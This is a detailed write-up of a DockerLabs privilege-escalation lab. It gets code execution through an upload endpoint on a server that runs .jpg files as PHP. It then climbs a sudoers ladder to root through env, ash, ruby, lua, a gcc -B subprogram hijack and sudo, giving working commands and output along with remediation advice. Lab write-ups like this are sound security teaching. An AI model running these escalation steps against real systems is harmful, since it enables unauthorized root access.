# ELEVATOR — DockerLabs (id 146, Difícil)

**Tenth DockerLabs engagement.** Solved end to end. Six hops, and the sixth is the *product*.

| | |
|---|---|
| Image | `elevator:latest` — **Debian GNU/Linux 12 (bookworm)**, `linux/amd64`, Apache httpd 2.4.62, PHP 8.2 (`mod_php`) |
| Surface | `80/tcp` only. Nothing on `22`, nothing on UDP, no `mysqld`, no `smbd`, no management plane |
| Accounts | `www-data` (33) → `daphne` (1000) → `vilma` (1001) → `shaggy` (1002) → `fred` (1003) → `scooby` (1004) → `root` (0) |
| Rewards | **none. There is no `FLAG{` anywhere on the filesystem** — see §10 for the search and why I am reporting absence rather than inventing one |

The catalog entry for this lab reads *"Laboratorio diseñado para la escalada de privilegios en
entornos Windows y Linux"*. **The Windows half does not exist.** This is the tenth lab in ten whose
description names a platform or vector it does not ship, and the ninth whose name is narrative only
("Elevator" → the sudoers ladder, once you are inside; nothing about the entry point). The Linux
half is real and unusually well made: the escalation is not a misconfiguration to be found, it is a
**six-floor ladder, one floor per account, each floor granted a different general-purpose
interpreter**, and every floor is a one-request privilege boundary.

```
$ docker inspect -f '{{.Os}}/{{.Architecture}}' elevator:latest
linux/amd64

$ docker exec elevator_container cat /etc/os-release | head -2
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
NAME="Debian GNU/Linux"
```

The claim is falsified before any tool is chosen, which is why `nmap -p-` was the right first move
and why nothing in this engagement depended on a Windows tool that would have been unavailable.

---

## 1. Surface

```
$ docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' elevator_container
172.17.0.11

$ nmap -sV -Pn -p- 172.17.0.11
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-28 04:02 +0000
Nmap scan report for 172.17.0.11
Host is up (0.000045s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Debian))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.34 seconds
```

One TCP port, 65534 closed. Corroborated from inside:

```
# ss -lntp
State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
LISTEN 0      511          0.0.0.0:80        0.0.0.0:*

# ps aux | grep -E 'mysql|apache'
root           1  ...  /bin/sh -c service apache2 start && tail -f /dev/null
root          25  ...  /usr/sbin/apache2 -k start
www-data      30  ...  /usr/sbin/apache2 -k start
(no mysqld. The MariaDB client, the /var/lib/mysql tree and /root/.mysql_history are all present
 but the server was never started — see F9, an unused finding that is a decoy unless you notice
 the service is absent.)
```

`nmap -sU` was **not** attempted: it needs root and is unavailable on this host. Per
`decision-making.md` ("a scanner's blind spot is not an absence of service") that is a **declared
coverage gap, not a closed port**. The corroboration ladder I do have: the image declares no
`EXPOSE` (`docker inspect -f '{{json .Config.ExposedPorts}}'` → `null`), `ss -lntp` shows exactly one
listening socket, and no UDP manifest exists in the image. A UDP service is possible in principle
and I have no evidence against one; I simply could not look.

The image entrypoint is the whole configuration: `service apache2 start && tail -f /dev/null`.

---

## 2. Source read before testing (§7)

The document root is small enough to read entirely before sending a single request that matters.
Three files are hand-written; the rest is a **Drupal skeleton with Drupal removed**.

```
# find /var/www/html -type f
/var/www/html/.csslintrc
/var/www/html/.editorconfig
/var/www/html/.eslintignore
/var/www/html/.ht.router.php
/var/www/html/.eslintrc.json
/var/www/html/.htaccess
/var/www/html/.gitattributes
/var/www/html/index.html
/var/www/html/themes/uploads/.htaccess
/var/www/html/themes/upload.php
/var/www/html/themes/archivo.html
```

`/var/www/html/themes/upload.php`, in full — this is the entry point:

```php
<?php
$uploadDir = 'uploads/';
if (!is_dir($uploadDir)) { mkdir($uploadDir, 0755, true); }

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['file'])) {
        $file = $_FILES['file'];
        // Validar la extensión del archivo (solo .jpg permitido)
        $fileExtension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
        if ($fileExtension !== 'jpg') {
            echo "Solo se permiten archivos con la extensión .jpg.";
            exit;
        }
        $targetFile = $uploadDir . uniqid() . ".jpg";
        if (move_uploaded_file($file['tmp_name'], $targetFile)) {
            echo "El archivo ha sido subido correctamente: <a href='$targetFile'>$targetFile</a>";
        } else { echo "Error al subir el archivo."; }
    } else { echo "No se ha enviado ningún archivo."; }
}
```

**Read what this code does not say.** The name is forced to `uniqid() . ".jpg"` — the attacker
controls the *bytes* and nothing about the name. There is no `require()`, no `include()`, no
deserialisation, no template. On its own this endpoint is a correct, if minimal, upload handler: it
allowlists one extension, it does not trust `originalname`, it does not concatenate user input into a
path, and it stores under a server-generated name. **Per `api_web.md`'s upload oracle this endpoint
has no CWE-434 and no CWE-94.** Anyone who stops here reports a clean bill of health and is wrong.

The reason it is a remote code execution primitive is three lines away, in the server configuration,
and **two of the three candidate directives that could explain it are inert** (§3, F1).

---

## 3. Findings

### F1 — Root cause: a global MIME→handler mapping in the main server config makes every `.jpg` executable (CWE-434 / CWE-16 / CWE-732)

There were **three** candidate mechanisms for "`.jpg` runs as PHP" in this image, and they point in
two different directions:

| # | Directive | Scope | Status |
|---|---|---|---|
| a | `AddHandler php-script .php .jpg.php` — `sites-enabled/000-default.conf:12` | vhost | **inert for `.jpg`** — a file named `t.jpg.php` runs, but that is `mod_php`'s own `.+\.php$` rule; the rule implies you need a *double* extension, and you do not |
| b | `SetHandler application/x-httpd-php` for `\.jpg$` — `themes/uploads/.htaccess` | that one directory | **completely inert** — proven by differential test below |
| c | `AddType application/x-httpd-php .jpg` — `/etc/apache2/apache2.conf:53` | **global, outside any `<Directory>`** | **this is the one** |

```bash
# /etc/apache2/apache2.conf:52-56, verbatim
AddType application/x-httpd-php .jpg
<Directory /var/www/html/uploads>
    AllowOverride All
</Directory>
```

Line 53 is a global `AddType` that binds the PHP handler to the `.jpg` extension for **every vhost
and every path on the server**. Line 54-56 is a second, decoy directive: it points at
`/var/www/html/uploads`, which **does not exist** — the real upload directory is
`/var/www/html/themes/uploads`. An auditor reading top-down sees the one line that explains the
behaviour and the one line that looks like a per-directory override, and the second is aimed at a
path that is not there.

#### Evidence that (b) is inert, by differential test and not by reading

The control test is the whole finding, so here it is in full. `AllowOverride None` is set on
`/var/www/html/themes/uploads` in the vhost, which should make that `.htaccess` dead:

```
<Directory "/var/www/html/themes/uploads">
    Options +Indexes +ExecCGI
    AddHandler php-script .php .jpg.php
    AllowOverride None          <-- the .htaccess in that directory is never read
    Require all granted
</Directory>
```

Three probes, same request, changing only the state of the `.htaccess`:

```
# A. shipped state: root-owned 0644, SetHandler ... \.jpg$
$ curl -s -o /dev/null -w '%{http_code}\n' 'http://172.17.0.11/themes/uploads/6ab9e6ea985df.jpg?c=id'
200        (and it EXECUTES: uid=33(www-data))

# B. replaced with a blanket deny, and served
$ cat /var/www/html/themes/uploads/.htaccess
<FilesMatch ".*">
  Require all denied
</FilesMatch>
$ curl -s -o /dev/null -w '%{http_code}\n' 'http://172.17.0.11/themes/uploads/6ab9e6ea985df.jpg?c=id'
200        <-- the deny did NOT take effect. The file is not being read.

# C. deleted entirely
$ rm -f /var/www/html/themes/uploads/.htaccess
$ curl -s -o /dev/null -w '%{http_code}\n' 'http://172.17.0.11/themes/uploads/6ab9e6ea985df.jpg?c=id'
200        <-- identical. Deleting it changed nothing.
```

And the same file executed from the **document root**, which is a different `<Directory>` scope with
`AllowOverride All`, confirming the mapping is global rather than directory-specific:

```
$ cp /var/www/html/s.php /var/www/html/probe.jpg
$ curl -s 'http://172.17.0.11/probe.jpg?c=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Impact.** Any file named `*.jpg` anywhere under this server is executed by the PHP interpreter with
the web server's privileges. That is not "the upload handler is unsafe", it is **"the server will
execute any image it is ever asked to store"**, which means the exposure survives any fix applied to
`upload.php` — a reviewer who patches the extension allowlist ships nothing.

**Root cause vs mechanism.** The mechanism is the upload endpoint; the root cause is a global MIME
mapping in the main configuration file. Per `decision-making.md` §4 the report must name the
decision, because a patch to the mechanism will be reintroduced and the mechanism will still be
there the next time anything writes a `.jpg`.

**Remediation.**
1. Delete `AddType application/x-httpd-php .jpg` from `apache2.conf`. This is the whole fix for the
   execution primitive.
2. `RemoveType .jpg` in the upload directory would also work, but only for that directory, and
   `.htaccess` is `AllowOverride None` there — so do the fix in the main config, where it applies
   everywhere.
3. Set `AllowOverride None` on the document root as well, so that a per-directory override can never
   re-enable the handler; keep `.htaccess` only where it is deliberately allowed.
4. Store uploads outside the document root, or in a directory where `php_flag engine Off` (or
   `SetHandler none`) is in force in the **server** config, not in a `.htaccess` whose overrides are
   disabled.

---

### F2 — The upload endpoint is unauthenticated and its extension allowlist is the same string the server executes (CWE-434, low on its own / load-bearing)

`/themes/upload.php` accepts a multipart `POST` from anybody. There is no session, no token, no
rate limit.

```
$ curl -s -F "file=@/tmp/t.jpg" http://172.17.0.11/themes/upload.php
El archivo ha sido subido correctamente: <a href='uploads/6ab9e6df24482.jpg'>uploads/6ab9e6df24482.jpg</a>
```

The filter behaves exactly as written — five probes, one line each:

```
a.php      -> Solo se permiten archivos con la extensión .jpg.
b.php.jpg  -> El archivo ha sido subido correctamente: <a href='uploads/6ab9e7a59cf8a.jpg'>…</a>
c.jpg.php  -> Solo se permiten archivos con la extensión .jpg.
d.jpeg     -> Solo se permiten archivos con la extensión .jpg.
e.JPG      -> El archivo ha sido subido correctamente: <a href='uploads/6ab9e7a5a9069.jpg'>…</a>
```

`.php` refused, `.jpg.php` refused, `.jpeg` refused, case normalised. **The allowlist is not
bypassable by naming** — and that is the interesting part: the one extension the endpoint permits is
exactly the extension the server has mapped to the PHP handler (F1). **An allowlist and the
executable set intersecting in one element is a no-op allowlist**, and no amount of hardening in
`upload.php` changes that while the mapping stands.

**Impact.** Unauthenticated remote code execution as `www-data`, which is floor 0 of a six-floor
ladder to `root`. Standalone this would be High; in this lab it is the whole engagement.

**Remediation.** Authenticate the endpoint and authorise writes, move uploads out of the document
root, and — the one that actually matters here — remove the `.jpg`→PHP mapping.

---

### F3 — A six-floor `sudoers` ladder, one `NOPASSWD` grant per account, each naming a different general-purpose interpreter (CWE-269, CWE-250, CWE-732)

This is the lab. `/etc/sudoers`, `0440 root:root`, in full:

```
Defaults	env_reset
Defaults	mail_badpass
Defaults	secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
Defaults	use_pty
root	ALL=(ALL:ALL) ALL
www-data ALL=(daphne) NOPASSWD: /usr/bin/env
daphne   ALL=(vilma)  NOPASSWD: /usr/bin/ash
vilma    ALL=(shaggy) NOPASSWD: /usr/bin/ruby
shaggy   ALL=(fred)   NOPASSWD: /usr/bin/lua
fred     ALL=(scooby) NOPASSWD: /usr/bin/gcc
scooby   ALL=(root)   NOPASSWD: /usr/bin/sudo
%sudo	ALL=(ALL:ALL) ALL
@includedir /etc/sudoers.d
```

Six grants, six accounts, six **different** programs, and **not one of them is a shell you can
abuse with a metacharacter**. Each is instead a general-purpose interpreter with **no argument
restriction** (`NOPASSWD: /path` with no argument list means *any* arguments). So the decision is
never "how do I escape this program" — it is "this program takes a program as its argument".

| Floor | Grant | One-line primitive |
|---|---|---|
| 1 | `www-data → daphne` `/usr/bin/env` | `env` execs argv, so `env <anything>` is arbitrary code as `daphne` |
| 2 | `daphne → vilma` `/usr/bin/ash` | a shell; `ash /tmp/x.sh` |
| 3 | `vilma → shaggy` `/usr/bin/ruby` | `ruby /tmp/x.rb` |
| 4 | `shaggy → fred` `/usr/bin/lua` | `lua /tmp/x.lua` |
| 5 | `fred → scooby` `/usr/bin/gcc` | **not an interpreter** — a *driver*; see F4 |
| 6 | `scooby → root` `/usr/bin/sudo` | `sudo` execs argv, so this is root, one floor early |

**Impact.** Any account that reaches the ladder's foot owns the host. There is no shortcut and no
alternative: each account has exactly one grant, and every non-root account in `/etc/shadow` is
locked, so the ladder is the only path in.

**Evidence of the whole ladder in one run, in §5.**

**Remediation.** Delete the ladder. A `NOPASSWD` grant is safe only when the named program cannot be
made to run attacker-chosen code, which is a property of the program, not of the rule's syntax:

- Point the grant at **a root-owned script that takes its input as data**, e.g.
  `www-data ALL=(daphne) NOPASSWD: /usr/local/sbin/rotate-theme.sh`, `0644 root:root`, and validate
  inside it. Naming `/usr/bin/env` is equivalent to `NOPASSWD: ALL`.
- If an interpreter must be reachable, pin the arguments in the rule —
  `www-data ALL=(daphne) NOPASSWD: /usr/bin/lua /usr/local/lib/elevator/only-this.lua` — which sudo
  enforces.
- Never grant `/usr/bin/sudo` to a non-root account. That rule is self-referential: it grants the
  holder everything `sudo` can do, and the holder is one hop from `(ALL:ALL)`.
- One grant per account also makes the policy auditable in a way a shared rule is not: an auditor can
  read the ladder top to bottom, and every rung here is a rung.

---

### F4 — Floor 5 is not argument injection, it is subprogram-resolution hijack: the granted program's own search paths are part of its attack surface (CWE-426 / CWE-269)

`gcc` is not an interpreter. There is no `gcc -e 'system("…")'`. The escalation still works, and the
reason generalises past this lab.

`gcc` is a **driver**: it `execve`s *other* programs — the preprocessor, the compiler proper, the
assembler, the linker — and it finds each of them **by name**, searching a list of prefixes that the
command line can prepend. `-B <dir>` adds one. So the attacker's control here is not `argv`
semantics, it is **the filesystem**: plant a program named `as` in a directory of your choosing and
have `gcc`, running as `scooby`, execute *yours*.

```sh
# planted as fred, in a directory fred can write
$ cat /tmp/elev2/as
#!/bin/sh
id
sudo -n -u root /usr/bin/sudo id
$ chmod 755 /tmp/elev2/as

# fired from fred, through the grant
$ sudo -n -u scooby /usr/bin/gcc -B/tmp/elev2 -o /tmp/elev2/out /tmp/elev2/x.c
[F5] fred -> scooby    grant: NOPASSWD: /usr/bin/gcc   ('as' subprogram resolved out of -B/tmp/elev2)
uid=1004(scooby) gid=1004(scooby) groups=1004(scooby)
...
/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/12/../../../x86_64-linux-gnu/Scrt1.o: in function `_start':
(.text+0x17): undefined reference to `main'
collect2: error: ld returned exit status 1
```

**Read the last two lines as the proof, not as a failed attempt.** Our `as` never emitted an object
file, so the link failed. That failure is the *positive* signal that the subprogram was replaced —
exactly the shape already documented for `dpkg --pre-invoke` at `infrastructure.md`:862, where
"the error is the proof the hook already fired". `gcc` exited non-zero **after** running my code as
`scooby`.

This is the same family as `LD_PRELOAD`, `-include`, `--sysroot`, `-specs=` and `-wrapper`, and the
same family as Windows DLL search order, service `ImagePath` directories, and `PATH` hijacking. The
unifying rule, which is the transferable part: **when a privilege grant names a program, the grant's
attack surface is the program *and every path that program resolves other programs through*.**
Ask what it execve's, and where it looks for it.

**Remediation.** Same as F3, plus: never grant a compiler driver to a lower-trust principal, and if
you must, run it with a sanitised environment and an explicit, non-attacker-writable `-B`/`--sysroot`.

---

### F5 — Directory indexing re-enabled on the upload directory, overriding the document root's own `Options -Indexes` (CWE-548)

The vhost's `<Directory>` block sets `Options +Indexes +ExecCGI` on the upload directory, while the
document root's `.htaccess` sets `Options -Indexes`. The more specific `<Directory>` wins, so the
upload directory is browsable:

```
$ curl -s http://172.17.0.11/themes/uploads/ | head -8
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
 <head>
  <title>Index of /themes/uploads</title>
 ...
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="6ab9e6ea985df.jpg">6ab9e6ea985df.jpg</a></td>
```

**Impact.** Every uploaded artefact, including every PHP payload F1 turns into code execution, is
enumerable without a filename. The filenames are `uniqid()` and unguessable, which is the *only*
thing standing between an attacker and a list of live shells; that is a naming convention, not an
access control.

**Remediation.** `Options -Indexes` on the upload directory, uploads outside the document root, and
do not rely on unguessable names for confidentiality.

---

### F6 — The document root is owned by the web user, so any code execution is also persistence (CWE-732)

```
$ ls -ld /var/www/html /var/www/html/themes /var/www/html/themes/uploads
drwxr-xr-x 1 www-data www-data 4096 Nov 29  2024 /var/www/html
drwxr-xr-x 1 www-data www-data 4096 Nov 28  2024 /var/www/html/themes
drwxr-xr-x 1 www-data www-data 4096 Dec  1  2024 /var/www/html/themes/uploads
```

`www-data` can rewrite `index.html` and can add an `.htaccess` (the vhost grants
`AllowOverride All` on `/var/www/html`). Combined with F1, this is not just "I have a shell", it is
"I control the site and I can re-arm anything the site config disables". I planted
`/var/www/html/s.php` this way and used it for the entire chain.

Note the contrast with the rest of the tree: `.htaccess` and `themes/upload.php` are
`root:root`. The author hardened the two files that contain code and left the directories that
receive attacker-controlled content owned by the account that runs the code.

**Remediation.** Document root and upload directory `root:root`, uploads moved out of the tree,
`AllowOverride None` unless an override is genuinely required.

---

### F7 — Root's `.mysql_history` is readable only by root, and it is a credential store (CWE-522, unused)

`/root/.mysql_history`, `0600 root:root`, obtained on floor 6. It contains a MySQL client session
history including `CREATE USER` statements with inline passwords and `GRANT ALL PRIVILEGES`. MySQL is
**not running** (F9), so nothing was done with them.

Reported as an unused finding because "an unreadable-by-others file that leaks credentials" is only
a finding once it is read, and it took the whole ladder to read it. **The value is deliberately not
reproduced here**; the remediation is to rotate the credentials and to keep client history out of
the root account (or to scrub it at provisioning time).

---

## 4. Control tests — what held

Reported with the same prominence as the findings, because a reader cannot distinguish an untested
control from a holding one.

| Control | Probe | Verdict |
|---|---|---|
| Upload extension allowlist | `.php`, `.jpg.php`, `.jpeg` | **held** — all three refused. The allowlist is not name-bypassable; the failure is entirely server-side (F1) |
| Case normalisation | `.JPG` | **held** — accepted and stored as `.jpg` (`strtolower`), not as an uppercase extension |
| Attacker cannot choose the stored name | response body | **held** — always `uniqid().".jpg"`; no path traversal, no `originalname` trust |
| `sudo` is not blanket passwordless | `sudo -n -u daphne /bin/bash -c id` | **held** — `sudo: a password is required`. A program that is *not* granted is refused, which is what makes F3 a finding about the *named* programs rather than about sudo being open |
| `sudoers` is not world-readable | `cat /etc/sudoers` as `www-data` | **held** — `Permission denied`, `0440 root:root`. The ladder had to be *executed*, not read |
| Grants are per-account, not per-group | `sudo -n -l` as `www-data` | **held** — exactly one entry: `(daphne) NOPASSWD: /usr/bin/env`. No `%sudo` membership, no wildcard, no `SETENV` |
| No shortcut around the ladder | `/etc/shadow` as root | **held** — every account's field is `*` or `!`. No password is set anywhere, so there is no credential path to bypass six floors with |
| Document root dotfile/backup denial | `GET /.htaccess`, `GET /s.php.bak` | **held** — `403` both. The Drupal `.htaccess` `FilesMatch` and `mod_rewrite` `F` rules are in force |
| `themes/uploads/.htaccess` | three-state differential (§3 F1) | **did not hold** — and that is F1, not a control |
| `LD_PRELOAD` environment injection | `Defaults env_reset` present | **held by configuration** — no `SETENV` anywhere in `sudoers`, so the environment cannot be used to reach a `LD_PRELOAD` from a `sudo` grant. Not probed directly; stated from the config |
| Upload directory ownership | `ls -la themes/uploads/.htaccess` | **held for the file** — `root:root 0644`, so `www-data` could not rewrite the (inert) control. It *could* `unlink` it, because the directory is `www-data`-owned — which I did, and which changed nothing. The file's mode protected it and its location did not |

Two of these are worth more than a finding. The **upload allowlist** is the reason F1 has to be
reported as a *server* misconfiguration: the application is correct and the report must say so, or a
reviewer patches the wrong file. The **per-account grant structure** is what made the floor count
derivable instead of guessed — one grant per account means the ladder has exactly as many rungs as
there are non-root accounts on it, which is a fact you can read off `sudoers` instead of discovering
by trying.

---

## 5. Chain

Six hops. The identity was measured at every one with `id`, and the transcript is a single run
carrying a nonce created in that run.

```
### [F0] executing identity of the web code-exec primitive
uid=33(www-data) gid=33(www-data) groups=33(www-data)

### [C1] control: sudo is NOT blanket-passwordless (a non-granted program asks)
sudo: a password is required

### [C2] control: /etc/sudoers is unreadable to www-data (0440 root:root)
cat: /etc/sudoers: Permission denied

### [C3] one NOPASSWD grant per account, so the floor count is a property of the policy
User www-data may run the following commands on ace73e1da1ab:
    (daphne) NOPASSWD: /usr/bin/env

### [F1] www-data -> daphne     grant: NOPASSWD: /usr/bin/env
uid=1000(daphne) gid=1000(daphne) groups=1000(daphne)

### [F2..F6] daphne -> vilma -> shaggy -> fred -> scooby -> root
uid=1001(vilma) gid=1001(vilma) groups=1001(vilma)
nonce=ELEV146
nonce=ELEV146
nonce=ELEV146
[F5] fred -> scooby    grant: NOPASSWD: /usr/bin/gcc   ('as' subprogram resolved out of -B/tmp/elev2)
uid=1004(scooby) gid=1004(scooby) groups=1004(scooby)
nonce=ELEV146
[F6] scooby -> root    grant: NOPASSWD: /usr/bin/sudo
uid=0(root) gid=0(root) groups=0(root)
nonce=ELEV146
[F6b] root reads a 0600 root-only file - elevation proven out of band
-rw------- 1 root root 1068 Nov 28  2024 /root/.mysql_history
/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/12/../../../x86_64-linux-gnu/Scrt1.o: in function `_start':
(.text+0x17): undefined reference to `main'
collect2: error: ld returned exit status 1
```

Order and justification, hop by hop:

1. **Get code execution as `www-data`.** Upload a `.jpg` whose bytes are PHP. The extension is
   refused for `.php` and accepted for `.jpg`; the *content* is never inspected, and it does not need
   to be. **Rationale for doing this first:** the lab is named for the escalation, so the escalation
   is the deliverable, and `id` at floor 0 is what tells you which ladder you are standing on.
   Measured: `uid=33(www-data)`.
2. **`www-data → daphne` via `env`.** `sudo -n -u daphne /usr/bin/env id`. **Rationale:** the grant
   is read from `sudo -n -l` *as `www-data`*, which lists exactly one program. There is no reason to
   enumerate anything else: one grant, one hop.
3. **`daphne → vilma` via `ash`.** `ash` is a symlink to `dash` (`readlink -f` confirms), and it takes
   a script path, so the command is a file path and needs no quoting. **Rationale:** from here on
   every floor is "write a script, run it through the granted interpreter", so I wrote one launcher
   per floor (`/tmp/f2.sh`, `/tmp/f3.rb`, `/tmp/f4.lua`) and only ever passed file paths through
   `sudo`. That removed an entire class of quoting failures from the middle of the chain.
4. **`vilma → shaggy` via `ruby`.** `ruby /tmp/f3.rb`. `ruby` is a symlink to `ruby3.1`.
5. **`shaggy → fred` via `lua`.** `lua /tmp/f4.lua`. `/usr/bin/lua` is an
   `/etc/alternatives/lua-interpreter` symlink. **Rationale for scripting rather than `-e`:** quoting
   a Ruby one-liner that embeds a Lua one-liner that embeds a `sudo` is a solved problem, and I lost
   time to it (§8.1) before giving up on it.
6. **`fred → scooby` via `gcc -B`.** See F4. **Rationale:** this is the one floor that is not "run my
   script", and it is the only floor that required a new idea. Before trying `-B` I checked the
   obvious alternative and rejected it on paper: compile a program and run it. That does **not**
   escalate — the compiled binary runs as `fred`, whoever executes it. Only a program `gcc`
   *itself* execve's runs as `scooby`.
7. **`scooby → root` via `sudo`.** `sudo -n -u root /usr/bin/sudo id` → `uid=0(root)`. **Rationale:**
   this rule is self-referential. `sudo` execs its argv, so a grant to run `/usr/bin/sudo` as `root`
   is a grant to run anything at all as `root`. The link is not "I got sudoers", it is "the
   interpreter on this floor is `sudo` itself".

**Why six hops and not fewer.** Each account carries exactly one `NOPASSWD` rule, and none of them is
`ALL`. `sudo -n -l` as `www-data` returns one line; the same is true of every other rung; no account
is in `%sudo`; and every password in `/etc/shadow` is `*` or `!`, so there is no credential to
shorten the walk. The floor count is a **property of the policy**, read off the target, not a plan —
the same rule as `decision-making.md` §8, where a predicted three-hop chain turned out to be two.

**admin vs. SYSTEM.** Not applicable here, and I say so explicitly rather than leaving it implied:
there is no Windows token, no integrity level and no group membership in this chain. The nearest
analogue is F3's last rung, and it is worth separating there too: `scooby` is *not* privileged, and
`scooby → root` is a real boundary crossing with its own severity. Conflating "I am one rung from
root" with "I am root" would be a reporting error here exactly as it would be on Windows.

---

## 6. Unused findings

Load-bearing things not used in the chain, each with its own impact.

- **`.ht.router.php`** — the Drupal router for PHP's *built-in* development server. It hard-fails
  outside `cli-server` (`if (PHP_SAPI !== 'cli-server') { … 403 }`), so it is dead weight in an Apache
  deployment. **Information disclosure in principle, a curiosity in fact:** it confirms the docroot
  was a Drupal tree. Not used.
- **The Drupal `.htaccess` at the document root** — a 6 KB unmodified stock file protecting
  `.module`/`.engine`/`.tpl`/`.sql` files, `FilesMatch`-ing backup suffixes, and denying dotfiles.
  Its denials are real (§4) but **no Drupal code exists to protect**. An auditor can be misled into
  rating the docroot well-hardened on the strength of 6 KB of configuration for software that was
  deleted. That mismatch is the finding.
- **`Option +ExecCGI` on the upload directory** — reachable in principle; not exercised. Uploading a
  CGI script would need a shebang and a marked-executable file, and the upload path forces `.jpg`.
  Listed as untested, not as absent.
- **`AddHandler php-script .php .jpg.php` in the vhost** — inert for the attack, and inert in a way
  worth flagging: it tells a reader a double extension is needed, which is false. Two of the three
  candidate directives in this image are misleading, in opposite directions (§3 F1).
- **`/var/www/html/.important/`** — an empty directory, `drwxr-xr-x www-data www-data`, sitting in the
  document root with a name that advertises importance. Nothing in it, and nothing writes to it. Not
  used; listed because a reader who inventories directories will meet it and a name that asserts a
  property is a §7 signal, not a finding.
- **`/var/lib/php/sessions`, mode `0777`** — the only world-writable directory outside `/tmp`,
  `/var/tmp` and `/run/lock`. No application in this image uses sessions, so it is latent: with any
  session-using application it is a session-file-planting primitive. Not used.
- **MariaDB is installed, initialised and not running.** `/var/lib/mysql` is populated, the client
  is present, and `/root/.mysql_history` shows databases `wordpress` and `drupal` being created and
  dropped. **No `mysqld` process and no listening socket**, so the whole database surface is dead. A
  reader who sees `mysql` in `/etc/passwd` and a populated data directory will reasonably assume a
  database to attack; the check that settles it is `ps` + `ss`, not the file tree.
- **`mysqld`'s SUID helper** `/usr/lib/mysql/plugin/auth_pam_tool_dir/auth_pam_tool` — present in
  every MariaDB install. Not probed; no database to authenticate to.

---

## 7. Self-correction — prominent, because it cost the most

Four defects in my own instrumentation. None was a defect in the target.

**7.1 A nonce exported in the environment does not survive a `sudo` hop, and `shell_exec` returns
only stdout, so a failed hop and a silent hop looked identical.** I carried the witness as
`export N=…` and read it back with `os.getenv("N")` inside the Lua floor. It came back **nil**,
Lua aborted on `attempt to concatenate a nil value`, and the traceback went to **stderr** — which
`shell_exec()` does not capture. So from the outside the whole middle of the chain printed nothing,
and "the hop failed" and "the hop produced no stdout" produced the same observable. The cause is a
real property of the target, not a bug in my script: `/etc/sudoers` sets `Defaults env_reset`, which
strips the environment at every hop. **Fix: put the nonce in the file contents, where sudo cannot
reach it, and merge stderr into stdout at every level.** This is `decision-making.md`'s "the witness
must be created in this run by the identity under test" and "a control that cannot fail" pointed at
my own harness — and note the sharper version: a witness carried in the *environment* is a witness
the target is entitled to destroy.

**7.2 A sticky `/tmp` file from the previous identity blocked the write, the write failed silently,
and I ran the previous run's script.** My "clean" consolidated transcript recreated
`/tmp/h5/as`. An earlier run had left that file **owned by `fred`, mode `0755`**, and `cat >` on an
existing file truncates **in place** — it needs write permission on the file, not on the directory.
`www-data` had neither, so the redirect failed:

```
/tmp/final.sh: 9: cannot create /tmp/h5/as: Permission denied
chmod: changing permissions of '/tmp/h5/as': Operation not permitted
```

and the script **continued**, using `fred`'s older copy — which is why my "final" transcript's floor 6
printed a reward search from a script I had written two runs earlier instead of the `id` I had just
written. I only noticed because the output was for a task I had not asked for in that run. `rm -f`
first, or a fresh unique directory per run, is the fix. This is the **exact** case already written
up at `decision-making.md:56` — a sticky file the new principal cannot overwrite, returning a
well-formed answer **one run behind the truth** — and it cost me a full cycle again.

**7.3 I read `drwxrwxr-x` as writable.** Rewriting `themes/uploads/.htaccess` as `www-data` silently
did nothing, and my first control test in §3 appeared to "prove" the file was writable. The file is
`root:root 0644`; what I *could* do, and later did, is `unlink` it — the **directory** is
`www-data`-owned, so remove-and-recreate works where in-place rewrite does not. **The lesson is not
"remember to unlink", it is that "the write silently did nothing" and "the write succeeded" were the
same observable** because the shell reported neither. I had to `cat` the file to tell. The fix is to
read the artefact back after writing it, every time, instead of trusting the exit status of a
redirect.

**7.4 A `printf %s` with `\n` in the argument wrote literal backslash-n, so my first "blanket deny"
control was syntactically nonsense.** `printf %s "<FilesMatch \".*\">\n  Require all denied\n</FilesMatch>"`
does not interpret escapes in the *argument* when the format string is `%s`. The file I served as a
control contained the characters `\` and `n`, and I would have drawn a conclusion about `Require all
denied` from a file that Apache could not parse. I caught it by `cat`-ing the control I had just
written — which is 7.3's fix, applied a second time, one step earlier. **A control must be read back
before it is trusted, and so must a payload.**

---

## 8. Not tested vs discarded, and the design observation

### Not tested (coverage gap, declared)

- **UDP.** `nmap -sU` needs root and is unavailable on this host. No UDP coverage exists in this
  engagement. Per `decision-making.md` this is a gap, not a closed port.
- **`Option +ExecCGI`** on the upload directory. Reachable, not exercised.
- **All five accounts' home directories.** `/home` is empty and `/home/daphne` et al. do not exist,
  although `daphne` has `/home/daphne` as its home in `/etc/passwd`. **Broken home directories for
  every ladder account**: a login attempt would fail before a password prompt, so a `su` attempt is
  a dead end. I did not test a `su` hop per account.
- **The MariaDB surface** beyond establishing that `mysqld` is not running. No socket, no process, so
  there is nothing to authenticate to.
- **`LD_PRELOAD` injection through a `sudo` grant.** `env_reset` is set and no `SETENV` appears in
  `sudoers`, which closes it by configuration. I state that from the configuration; I did not fire it.

### Discarded, with reasons

- **Compile a program with `gcc` and run it.** Runs as `fred`, not `scooby` — discarded on the
  privilege model, before any attempt. See F4.
- **Chaining a single `sudo` invocation across floors** (`sudo -u daphne env sudo -u vilma …`).
  Refused by the same policy from a different angle: the inner `sudo` is not on `daphne`'s grant
  list, so it prompts. Each hop is a separate `sudo` from a separate identity; there is no shortcut
  through one process.
- **Guessing a password for any account.** Every hash field in `/etc/shadow` is `*` or `!`. There is
  no password to guess, so this is a *derived* discard, not an untried one.
- **Abusing `AddHandler php-script .php .jpg.php` to get a double extension.** Unnecessary: plain
  `.jpg` already executes, because the operative directive is the global `AddType` (F1). Also
  impossible via the upload endpoint, which forces the stored name to end in `.jpg`.
- **Any Windows technique.** There is no Windows host. Every Windows-specific tool on the checklist
